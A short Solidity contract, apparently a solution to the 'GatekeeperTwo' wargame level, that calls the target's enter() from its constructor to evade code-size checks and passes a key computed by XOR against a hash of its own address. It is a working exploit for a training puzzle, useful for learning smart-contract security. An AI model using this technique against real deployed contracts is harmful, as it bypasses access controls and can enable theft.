// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";
import "hardhat/console.sol";

contract GatekeeperTwoAttack {

  constructor(address _gatekeeperTwo) {
      GatekeeperTwo gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);
      uint64 num = type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
      bool result = gatekeeperTwo.enter(bytes8(num));
      console.log(result);
  }
}
